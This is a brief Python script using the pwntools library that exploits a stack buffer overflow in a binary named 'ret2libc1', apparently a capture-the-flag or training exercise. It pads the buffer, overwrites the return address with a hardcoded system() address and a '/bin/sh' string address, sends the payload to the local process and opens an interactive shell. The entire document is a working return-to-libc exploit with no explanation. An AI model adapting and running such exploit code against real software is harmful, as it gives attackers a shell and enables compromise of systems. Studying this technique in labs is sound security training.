from pwn import *
system_addr = 0x08048460
bin_sh_addr = 0x08048720
offset = 0x6c + 4
payload = b'A' * offset + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
sh = process('./ret2libc1')
sh.sendline(payload)
sh.interactive()
